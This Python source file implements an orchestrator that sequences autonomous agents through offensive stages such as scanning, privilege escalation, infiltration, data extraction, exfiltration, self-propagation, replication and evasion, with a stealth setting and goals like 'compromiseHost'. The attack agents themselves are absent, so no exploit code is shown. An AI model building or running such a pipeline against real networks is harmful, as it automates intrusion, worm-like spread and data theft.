#!/usr/bin/env python3
"""
STEP 2: Mission Orchestrator - Autonomous Agent Coordination Pipeline

Purpose:
- Takes high-level MissionProfile objects with mission type, targets, time budgets
- Auto-generates multi-stage pipelines based on mission type (FOOTHOLD, ESCALATE, etc.)
- Manages state: QUEUED → RUNNING → BLOCKED → COMPLETED
- Handles agent handoffs with typed, versioned results
- Implements checkpoint/resume with exponential backoff
- Integrates with mission_profiles for dynamic configuration

Key Improvements (Phase 1 Integration):
- Now accepts MissionProfile objects instead of string goals
- Supports 9 mission types with different stage pipelines per type
- Uses mission profile's agent variant preferences
- Respects skip_stages configuration
- Honors time budget and stealth level for behavior tuning
"""

import json
import logging
import time
import uuid
import os
import re
from enum import Enum
from typing import Dict, List, Optional, Any, Callable, Union, TYPE_CHECKING, cast
from dataclasses import dataclass, field, asdict
from datetime import datetime
import redis

# Import mission profile system for type checking and runtime
if TYPE_CHECKING:
    from orchestration.mission_profiles import (
        MissionProfile, MissionType, TimeBudgetMode,
        ScoutVariant, InfiltratorVariant, ExfiltratorVariant, PrivescVariant, PropagationVariant
    )

# Runtime imports (may fail if module not present)
try:
    from orchestration.mission_profiles import (
        MissionProfile as _RuntimeMissionProfile, MissionType as _RuntimeMissionType,
        TimeBudgetMode as _RuntimeTimeBudgetMode,
        ScoutVariant as _RuntimeScoutVariant, InfiltratorVariant as _RuntimeInfiltratorVariant,
        ExfiltratorVariant as _RuntimeExfiltratorVariant, PrivescVariant as _RuntimePrivescVariant,
        PropagationVariant as _RuntimePropagationVariant
    )
    MISSION_PROFILES_AVAILABLE = True
    MissionType = _RuntimeMissionType
    TimeBudgetMode = _RuntimeTimeBudgetMode
except Exception:
    MISSION_PROFILES_AVAILABLE = False
    _RuntimeMissionProfile = None  # type: Optional[type]
    _RuntimeMissionType = None

logger = logging.getLogger(__name__)


class MissionStageState(Enum):
    """Mission lifecycle states within a stage"""
    QUEUED = "queued"              # Waiting to run
    RUNNING = "running"            # Currently executing
    BLOCKED = "blocked"            # Waiting for dependency
    COMPLETED = "completed"        # Finished successfully
    FAILED = "failed"              # Failed, retrying or giving up
    SKIPPED = "skipped"            # Dependency failed, skipped


class MissionPriority(Enum):
    """Mission execution priority"""
    LOW = 1
    NORMAL = 2
    HIGH = 3
    CRITICAL = 4


@dataclass
class HandoffResult:
    """Result passed from one agent to next (typed, versioned)"""
    stage_name: str                 # e.g., "SCAN", "ESCALATE"
    success: bool                   # True/False
    data: Dict[str, Any]           # Results (hosts, tokens, etc)
    confidence: float = 1.0         # 0.0-1.0 certainty
    uncertainty: Optional[str] = None  # Reason for low confidence
    version: str = "1.0"           # Protocol version
    timestamp: str = field(default_factory=lambda: datetime.utcnow().isoformat())
    error: Optional[str] = None    # If failed, error message

    def to_dict(self) -> Dict:
        return asdict(self)

    @staticmethod
    def from_dict(data: Dict) -> 'HandoffResult':
        """Deserialize with version check"""
        expected_version = "1.0"
        if data.get("version") != expected_version:
            logger.warning(f"Version mismatch: expected {expected_version}, got {data.get('version')}")
        return HandoffResult(**{k: v for k, v in data.items() if k in HandoffResult.__dataclass_fields__})


@dataclass
class MissionStage:
    """Single stage within a mission (SCAN, ESCALATE, EXTRACT, EXFIL)"""
    name: str                       # "SCAN", "ESCALATE", "EXTRACT", "EXFIL"
    agent_type: str                 # "ScoutAgent", "PrivescAgent", etc
    parameters: Dict[str, Any]      # {subnet: "192.168.1.0/24", ...}
    dependencies: List[str] = field(default_factory=list)  # ["SCAN"] for ESCALATE
    state: MissionStageState = MissionStageState.QUEUED
    attempted: int = 0
    max_retries: int = 3
    backoff_base: float = 2.0       # exponential backoff: 2^attempt seconds
    result: Optional[HandoffResult] = None
    stage_id: str = field(default_factory=lambda: str(uuid.uuid4()))
    created_at: str = field(default_factory=lambda: datetime.utcnow().isoformat())
    started_at: Optional[str] = None
    completed_at: Optional[str] = None

    def to_dict(self) -> Dict:
        data = asdict(self)
        data['state'] = self.state.value
        data['result'] = self.result.to_dict() if self.result else None
        return data

    def backoff_delay(self) -> float:
        """Calculate backoff delay for next retry"""
        if self.attempted == 0:
            return 0.0
        return min(300.0, self.backoff_base ** self.attempted)  # Cap at 5 minutes

    def can_retry(self) -> bool:
        """Check if retry is possible"""
        return self.attempted < self.max_retries


@dataclass
class OrchestrationMission:
    """High-level goal broken into stages"""
    goal: str                       # "compromiseHost(192.168.1.100)"
    target: str                     # "192.168.1.100"
    mission_id: str = field(default_factory=lambda: str(uuid.uuid4()))
    stages: List[MissionStage] = field(default_factory=list)
    state: MissionStageState = MissionStageState.QUEUED
    priority: MissionPriority = MissionPriority.NORMAL
    created_at: str = field(default_factory=lambda: datetime.utcnow().isoformat())
    completed_at: Optional[str] = None
    context: Dict[str, Any] = field(default_factory=dict)  # Shared context between stages

    def to_dict(self) -> Dict:
        data = asdict(self)
        data['state'] = self.state.value
        data['priority'] = self.priority.value
        data['stages'] = [s.to_dict() for s in self.stages]
        return data


class MissionOrchestrator:
    """
    Orchestrate multi-stage missions with autonomous agent coordination.
    
    Usage:
        orchestrator = MissionOrchestrator()
        mission = orchestrator.create_mission("compromiseHost(192.168.1.100)")
        results = orchestrator.execute_mission(mission)
    """
    
    REDIS_HOST = os.environ.get('REDIS_HOST', 'localhost')
    REDIS_PORT = int(os.environ.get('REDIS_PORT', 6379))
    
    def __init__(self, agent_registry: Optional[Dict[str, Callable]] = None, 
                 use_redis: bool = True):
        """
        Args:
            agent_registry: {agent_type: executor_func}
                e.g., {"ScoutAgent": scan_func, "PrivescAgent": escalate_func}
            use_redis: Whether to persist state to Redis (for crash recovery)
        """
        self.agent_registry = agent_registry or {}
        self.use_redis = use_redis
        self.redis_client = None
        
        # Try Redis for persistence
        if use_redis:
            try:
                self.redis_client = redis.Redis(
                    host=self.REDIS_HOST,
                    port=self.REDIS_PORT,
                    decode_responses=True,
                    socket_connect_timeout=5
                )
                self.redis_client.ping()
                logger.info(f"[✓] Orchestrator Redis initialized: {self.REDIS_HOST}:{self.REDIS_PORT}")
            except Exception as e:
                logger.warning(f"[!] Redis unavailable for orchestrator: {e}")
                self.redis_client = None
        
        # In-memory mission cache
        self.missions: Dict[str, OrchestrationMission] = {}
        
        logger.info("[✓] MissionOrchestrator initialized")
    
    def create_mission(self, goal_or_profile: Union[str, 'MissionProfile'], 
                       target: Optional[str] = None) -> OrchestrationMission:
        """
        Create a mission from either:
        1. MissionProfile object (new, Phase 1 integration)
        2. Legacy string goal (backwards compatibility)
        
        Args:
            goal_or_profile: MissionProfile object OR string goal like "compromiseHost(192.168.1.100)"
            target: Legacy param, only used if goal_or_profile is a string
            
        Returns:
            OrchestrationMission with auto-generated stages based on mission type/goal
        """
        
        if isinstance(goal_or_profile, str):
            # Legacy string goal API (backwards compatibility)
            goal = goal_or_profile
            if target is None:
                # Extract target from goal: "compromiseHost(192.168.1.100)" → "192.168.1.100"
                match = re.search(r'compromiseHost\((.*?)\)', goal)
                if match:
                    target = match.group(1).strip("'\"")
                else:
                    target = "unknown"

            mission = OrchestrationMission(goal=goal, target=target)
            mission.stages = [
                MissionStage(
                    name="SCAN",
                    agent_type="ScoutAgent",
                    parameters={"target": target},
                    dependencies=[]
                ),
                MissionStage(
                    name="ESCALATE",
                    agent_type="PrivescAgent",
                    parameters={"target": target},
                    dependencies=["SCAN"]
                ),
                MissionStage(
                    name="EXTRACT",
                    agent_type="ExtractorAgent",
                    parameters={"target": target},
                    dependencies=["ESCALATE"]
                ),
                MissionStage(
                    name="EXFIL",
                    agent_type="ExfiltratorAgent",
                    parameters={"target": target},
                    dependencies=["EXTRACT"]
                )
            ]
            logger.info(f"[🎯] Mission created (legacy mode): {goal} (ID: {mission.mission_id[:8]}...)")
        elif MISSION_PROFILES_AVAILABLE and _RuntimeMissionProfile is not None and isinstance(goal_or_profile, _RuntimeMissionProfile):
            profile = goal_or_profile
            mission = OrchestrationMission(
                goal=f"{profile.mission_type.value}({profile.target})",
                target=profile.target
            )

            # Generate stages based on mission type
            stages = self._generate_stages_for_mission_type(
                mission_type=profile.mission_type,
                target=profile.target,
                skip_stages=profile.skip_stages,
                variant_preferences={
                    'scout': profile.get_scout_variant(),
                    'infiltrator': profile.get_infiltrator_variant(),
                    'exfiltrator': profile.get_exfiltrator_variant(),
                    'privesc': profile.get_privesc_variant(),
                    'propagation': profile.get_propagation_variant(),
                }
            )

            mission.stages = stages
            mission.context['mission_profile'] = profile  # Store profile in context
            mission.context['mission_type'] = profile.mission_type.value
            mission.context['time_budget_minutes'] = profile.time_budget_minutes
            mission.context['stealth_level'] = profile.stealth_level

            logger.info(f"[🎯] Mission created from profile: {profile.mission_type.value}({profile.target})")
            logger.info(f"     Time budget: {profile.time_budget_minutes}min, Stealth: {profile.stealth_level}/100")
        else:
            raise TypeError(f"Unsupported mission descriptor type: {type(goal_or_profile)}")
        
        self.missions[mission.mission_id] = mission
        
        # Persist to Redis
        self._persist_mission(mission)
        
        return mission
    
    def _generate_stages_for_mission_type(self, mission_type: 'MissionType', target: str,
                                         skip_stages: Optional[List[str]] = None,
                                         variant_preferences: Optional[Dict[str, Any]] = None) -> List[MissionStage]:
        """
        Generate stage pipeline based on mission type.
        
        Maps mission types to appropriate stage sequences:
        - FOOTHOLD: SCAN → INFILTRATE → ESCALATE → EXTRACT
        - ESCALATE: ESCALATE → EXTRACT (skip SCAN)
        - INFILTRATE: SCAN → ESCALATE → INFILTRATE → POST_ESCALATION
        - EXTRACT: SCAN → ESCALATE → INFILTRATE → EXTRACT → EXFIL
        - PROPAGATE: SCAN → SENSOR → PROPAGATION → REPLICATE
        - DOMINATE: PROPAGATE pipeline + LEARNING → TARGETING
        - EXECUTE: SCAN → EXECUTE (skip EXTRACT/EXFIL)
        - MAINTAIN: INFILTRATE → EVASION → HIBERNATION
        - EXFIL: EXFIL (standalone)
        
        Args:
            mission_type: MissionType enum value
            target: Target IP/subnet/domain
            skip_stages: List of stage names to skip
            variant_preferences: Dict of variant preferences per agent type
            
        Returns:
            List of MissionStage objects in execution order
        """
        skip_stages = skip_stages or []
        variant_preferences = variant_preferences or {}
        
        # Define stage templates (agent_type, dependencies)
        stage_definitions = {
            'SCAN': ('ScoutAgent', []),
            'ESCALATE': ('PrivescAgent', ['SCAN']),
            'INFILTRATE': ('InfiltratorAgent', ['ESCALATE']),
            'EXTRACT': ('ExtractorAgent', ['INFILTRATE']),
            'EXFIL': ('ExfiltratorAgent', ['EXTRACT']),
            'POST_ESCALATION': ('PostEscalationAgent', ['ESCALATE']),
            'SENSOR': ('SensorAgent', ['SCAN']),
            'PROPAGATION': ('PropagationAgent', ['SENSOR']),
            'REPLICATE': ('ReplicatorAgent', ['PROPAGATION']),
            'LEARNING': ('LearningAgent', ['PROPAGATION']),
            'TARGETING': ('TargetingEngine', ['LEARNING']),
            'EXECUTE': ('ExecutorAgent', ['SCAN']),
            'EVASION': ('EvasionAgent', ['INFILTRATE']),
            'HIBERNATION': ('HibernationAgent', ['EVASION']),
        }
        
        # Mission type → stage sequence mappings
        mission_pipelines = {
            MissionType.FOOTHOLD: ['SCAN', 'INFILTRATE', 'ESCALATE', 'EXTRACT'],
            MissionType.ESCALATE: ['ESCALATE', 'EXTRACT'],
            MissionType.INFILTRATE: ['SCAN', 'ESCALATE', 'INFILTRATE', 'POST_ESCALATION'],
            MissionType.EXTRACT: ['SCAN', 'ESCALATE', 'INFILTRATE', 'EXTRACT', 'EXFIL'],
            MissionType.PROPAGATE: ['SCAN', 'SENSOR', 'PROPAGATION', 'REPLICATE'],
            MissionType.DOMINATE: ['SCAN', 'SENSOR', 'PROPAGATION', 'REPLICATE', 'LEARNING', 'TARGETING'],
            MissionType.EXECUTE: ['SCAN', 'EXECUTE'],
            MissionType.MAINTAIN: ['INFILTRATE', 'EVASION', 'HIBERNATION'],
            MissionType.EXFIL: ['EXFIL'],
        }
        
        # Get the stage sequence for this mission type
        stage_names = mission_pipelines.get(mission_type, [])
        
        # First pass: Determine which stages will actually be in the mission
        # (after filtering skip_stages)
        included_stages = set()
        for stage_name in stage_names:
            if stage_name not in skip_stages:
                included_stages.add(stage_name)
        
        # Build MissionStage objects
        stages = []
        for stage_name in stage_names:
            # Skip if in skip_stages list
            if stage_name in skip_stages:
                logger.debug(f"[⊘] Skipping stage: {stage_name}")
                continue
            
            if stage_name not in stage_definitions:
                logger.warning(f"[!] Unknown stage: {stage_name}")
                continue
            
            agent_type, dependencies = stage_definitions[stage_name]
            
            # Filter dependencies:
            # 1. Remove stages in skip_stages
            # 2. Remove stages not in the mission pipeline at all
            dependencies = [d for d in dependencies if d not in skip_stages and d in included_stages]
            
            # Build stage parameters
            parameters = {
                'target': target,
                'mission_type': mission_type.value,
            }
            
            # Add variant preference if available
            if 'scout' in variant_preferences and agent_type == 'ScoutAgent':
                parameters['variant'] = variant_preferences['scout'].value
            elif 'infiltrator' in variant_preferences and agent_type == 'InfiltratorAgent':
                parameters['variant'] = variant_preferences['infiltrator'].value
            elif 'exfiltrator' in variant_preferences and agent_type == 'ExfiltratorAgent':
                parameters['variant'] = variant_preferences['exfiltrator'].value
            elif 'privesc' in variant_preferences and agent_type == 'PrivescAgent':
                parameters['variant'] = variant_preferences['privesc'].value
            elif 'propagation' in variant_preferences and agent_type == 'PropagationAgent':
                parameters['variant'] = variant_preferences['propagation'].value
            
            stage = MissionStage(
                name=stage_name,
                agent_type=agent_type,
                parameters=parameters,
                dependencies=dependencies
            )
            
            stages.append(stage)
        
        logger.info(f"[→] Generated {len(stages)} stages for {mission_type.value}: {[s.name for s in stages]}")
        return stages
    
    def register_agent_executor(self, agent_type: str, executor: Callable):
        """
        Register executor function for agent type.
        
        Args:
            agent_type: e.g., "ScoutAgent"
            executor: async callable that takes (stage: MissionStage, context: Dict) → HandoffResult
        """
        self.agent_registry[agent_type] = executor
        logger.info(f"[✓] Registered executor for {agent_type}")
    
    def execute_mission(self, mission: OrchestrationMission, 
                       timeout_per_stage: int = 300) -> Dict[str, HandoffResult]:
        """
        Execute mission stages in sequence with dependency tracking.
        
        Returns:
            {stage_name: HandoffResult}
        """
        logger.info(f"[🚀] Executing mission: {mission.goal} (ID: {mission.mission_id[:8]}...)")
        
        results: Dict[str, HandoffResult] = {}
        mission.state = MissionStageState.RUNNING
        self._persist_mission(mission)
        
        try:
            for stage in mission.stages:
                # Check dependencies
                if not self._check_dependencies_satisfied(stage, mission):
                    logger.warning(f"[⚠️] Stage {stage.name} blocked (dependency failed)")
                    stage.state = MissionStageState.BLOCKED
                    continue
                
                # Execute with retry
                result = self._execute_stage_with_retry(stage, mission, timeout_per_stage)
                results[stage.name] = result
                
                # Update context for next stage
                if result.success:
                    mission.context.update(result.data)
                    stage.state = MissionStageState.COMPLETED
                    stage.result = result
                else:
                    stage.state = MissionStageState.FAILED
                    logger.error(f"[❌] Stage {stage.name} failed: {result.error}")
                    # Continue to next stage anyway (don't hard-stop)
                
                self._persist_mission(mission)
        
        except Exception as e:
            logger.error(f"[❌] Mission execution error: {e}")
            mission.state = MissionStageState.FAILED
        finally:
            mission.state = MissionStageState.COMPLETED
            mission.completed_at = datetime.utcnow().isoformat()
            self._persist_mission(mission)
        
        logger.info(f"[✅] Mission completed: {mission.mission_id[:8]}... (stages: {len(results)}/{len(mission.stages)})")
        return results
    
    def _execute_stage_with_retry(self, stage: MissionStage, mission: OrchestrationMission,
                                  timeout: int) -> HandoffResult:
        """Execute single stage with exponential backoff retry"""
        while stage.attempted < stage.max_retries:
            stage.attempted += 1
            logger.info(f"[→] Executing {stage.name} (attempt {stage.attempted}/{stage.max_retries})")
            
            # Get executor
            executor = self.agent_registry.get(stage.agent_type)
            if not executor:
                error_msg = f"No executor registered for {stage.agent_type}"
                logger.error(f"[❌] {error_msg}")
                return HandoffResult(
                    stage_name=stage.name,
                    success=False,
                    data={},
                    error=error_msg
                )
            
            try:
                # Set timeout for stage execution
                stage.started_at = datetime.utcnow().isoformat()
                
                # Execute with stage parameters + mission context
                params = {**mission.context, **stage.parameters}
                
                # Call executor (sync wrapper around async if needed)
                result = executor(stage, params)
                
                # Ensure result is HandoffResult
                if not isinstance(result, HandoffResult):
                    result = HandoffResult(
                        stage_name=stage.name,
                        success=bool(result),
                        data=result if isinstance(result, dict) else {'result': result}
                    )
                
                stage.result = result
                stage.completed_at = datetime.utcnow().isoformat()
                
                if result.success:
                    logger.info(f"[✅] Stage {stage.name} succeeded (confidence: {result.confidence})")
                    return result
                else:
                    logger.warning(f"[⚠️] Stage {stage.name} failed: {result.error}")
                    
                    # Check if can retry
                    if not stage.can_retry():
                        logger.error(f"[❌] Stage {stage.name} max retries exceeded")
                        return result
                    
                    # Calculate backoff and wait
                    delay = stage.backoff_delay()
                    logger.info(f"[⏳] Retrying {stage.name} in {delay:.1f}s (exponential backoff)")
                    time.sleep(delay)
            
            except Exception as e:
                logger.error(f"[❌] Stage {stage.name} exception: {e}")
                
                if not stage.can_retry():
                    return HandoffResult(
                        stage_name=stage.name,
                        success=False,
                        data={},
                        error=str(e)
                    )
                
                delay = stage.backoff_delay()
                logger.info(f"[⏳] Retrying {stage.name} in {delay:.1f}s (exception)")
                time.sleep(delay)
        
        return HandoffResult(
            stage_name=stage.name,
            success=False,
            data={},
            error=f"Max retries ({stage.max_retries}) exceeded"
        )
    
    def _check_dependencies_satisfied(self, stage: MissionStage, 
                                      mission: OrchestrationMission) -> bool:
        """Check if all dependencies are completed successfully"""
        for dep_name in stage.dependencies:
            dep_stage = next((s for s in mission.stages if s.name == dep_name), None)
            if not dep_stage or dep_stage.state != MissionStageState.COMPLETED:
                return False
        return True
    
    def _persist_mission(self, mission: OrchestrationMission):
        """Save mission state to Redis (for crash recovery)"""
        if not self.redis_client:
            return
        
        try:
            key = f"mission:{mission.mission_id}"
            serialized = json.dumps(mission.to_dict(), default=str)
            # TTL: 24 hours (mission should complete or fail within this time)
            self.redis_client.setex(key, 86400, serialized)
        except Exception as e:
            logger.warning(f"[!] Failed to persist mission to Redis: {e}")
    
    def load_mission(self, mission_id: str) -> Optional[OrchestrationMission]:
        """Load mission from memory or Redis"""
        # Try memory first
        if mission_id in self.missions:
            return self.missions[mission_id]
        
        # Try Redis
        if self.redis_client:
            try:
                key = f"mission:{mission_id}"
                data = self.redis_client.get(key)
                if data:
                    if isinstance(data, bytes):
                        data = data.decode("utf-8")
                    elif not isinstance(data, str):
                        data = str(data)
                    mission_dict = json.loads(cast(str, data))
                    # Reconstruct mission (simplified)
                    mission = OrchestrationMission(
                        goal=mission_dict['goal'],
                        target=mission_dict['target'],
                        mission_id=mission_dict['mission_id']
                    )
                    self.missions[mission_id] = mission
                    return mission
            except Exception as e:
                logger.warning(f"[!] Failed to load mission from Redis: {e}")
        
        return None
    
    def get_mission_status(self, mission_id: str) -> Dict:
        """Get current mission status"""
        mission = self.load_mission(mission_id)
        if not mission:
            return {'error': 'Mission not found'}
        
        stages_status = []
        for stage in mission.stages:
            stages_status.append({
                'name': stage.name,
                'state': stage.state.value,
                'attempted': stage.attempted,
                'result': stage.result.to_dict() if stage.result else None
            })
        
        return {
            'mission_id': mission.mission_id,
            'goal': mission.goal,
            'state': mission.state.value,
            'stages': stages_status,
            'context': mission.context
        }


# Import at module level
import os
